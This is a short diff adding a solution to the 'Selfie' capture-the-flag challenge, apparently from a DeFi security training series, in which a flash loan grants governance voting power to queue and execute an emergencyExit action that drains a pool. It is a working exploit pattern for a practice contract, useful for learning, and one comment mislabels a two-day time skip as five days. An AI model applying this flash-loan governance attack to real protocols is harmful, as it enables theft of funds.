@@ -39,6 +39,14 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // We request a loan from the pool and use that tokens to bypass the restriction of balance in the governance contract
+        // create a new action in the governance using the pool as target and the encode function call to emergencyExit
+        // wait until the action can be executed and take the tokens
+        let selfieTaker = await (await ethers.getContractFactory('SelfieTaker', player)).deploy();
+
+        await selfieTaker.requestFlashLoan(pool.address, governance.address);
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 5 days
+        await governance.executeAction(await selfieTaker.actionId());
     });
 
     after(async function () {
